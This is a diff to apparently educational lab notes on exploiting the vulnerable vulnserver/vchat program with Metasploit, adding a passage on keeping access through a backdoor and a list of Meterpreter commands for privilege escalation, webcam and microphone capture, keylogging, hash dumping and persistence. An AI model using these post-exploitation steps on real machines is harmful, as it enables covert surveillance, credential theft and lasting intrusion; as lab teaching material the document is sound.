@@ -101,6 +101,11 @@ Meterpreter provides the attacker an interactive shell exploring the target mach
 For example, within meterpreter, *hashdump* can list all the usernames and the passwords.
 Then use John the ripper to crack password hashes.
 
+The attacker may also want to maintaining access to the compromsied computer
+so that even if the compromised computer restarts, the attacker can still get in.
+If access is not maintained, the attacker will have to exploit it from the beginning in case the hacked system is closed or patched
+The best way of maintaining access is to install a backdoor.
+
 ### knock module against vchat
 
 Here is what happens (armitage shows in the exploit window) when using the knock module without selecting *Use a reverse connection*
@@ -153,6 +158,22 @@ msf6 exploit(windows/vulnserver/knock) > exploit -j
 [*] 192.168.1.19:9999 - Trying target vulnserver-KNOCK...
 [*] Sending stage (175174 bytes) to 192.168.1.19
 ```
+### Meterpreter commands
+- help
+- getuid
+- getsystem
+- webcam_list
+  - Enable webcam within VM (Devices -> Webcams -> Click the camera name)
+- webcam_snap 
+- webcam_stream
+- screenshot
+- record_mic
+- keyscan_start
+- keyscan_dump
+- keyscan_stop
+- shell
+- Installing service Persistence and opening a persistent backdoor
+
 
 <!---
 so you can see now once you
